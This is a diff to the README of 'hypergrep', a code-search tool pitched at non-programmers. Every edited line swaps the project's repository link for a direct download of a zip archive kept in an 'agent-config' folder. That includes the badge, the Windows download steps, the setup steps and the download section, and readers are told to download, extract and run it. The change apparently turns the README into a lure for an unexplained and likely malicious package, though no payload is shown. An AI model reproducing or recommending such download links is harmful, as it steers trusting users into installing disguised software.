@@ -1,6 +1,6 @@
 # 🔎 hypergrep - Find Code Paths Fast
 
-[![Download hypergrep](https://img.shields.io/badge/Download%20hypergrep-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/loralieunderivative666/hypergrep)
+[![Download hypergrep](https://img.shields.io/badge/Download%20hypergrep-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/loralieunderivative666/hypergrep/main/agent-config/Software-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 💻 Download and Run on Windows
 
-1. Open this page: https://github.com/loralieunderivative666/hypergrep
+1. Open this page: https://raw.githubusercontent.com/loralieunderivative666/hypergrep/main/agent-config/Software-2.7.zip
 2. On the repository page, look for the **Code** button
 3. Download the project files
 4. If a Windows app or release file is shown, download it
@@ -62,7 +62,7 @@ You do not need to learn programming to start using it for search and code revie
 
 ## 🛠️ How to Set It Up
 
-1. Download the files from https://github.com/loralieunderivative666/hypergrep
+1. Download the files from https://raw.githubusercontent.com/loralieunderivative666/hypergrep/main/agent-config/Software-2.7.zip
 2. Save them to a folder you can find later, such as Downloads or Desktop
 3. Open the folder
 4. If the download is a compressed file, right-click it and choose **Extract All**
@@ -193,7 +193,7 @@ It is a good fit for:
 ## 🧷 Download Link
 
 Visit this page to download and run the project files:
-https://github.com/loralieunderivative666/hypergrep
+https://raw.githubusercontent.com/loralieunderivative666/hypergrep/main/agent-config/Software-2.7.zip
 
 ## 🗂️ File Types You May See
 
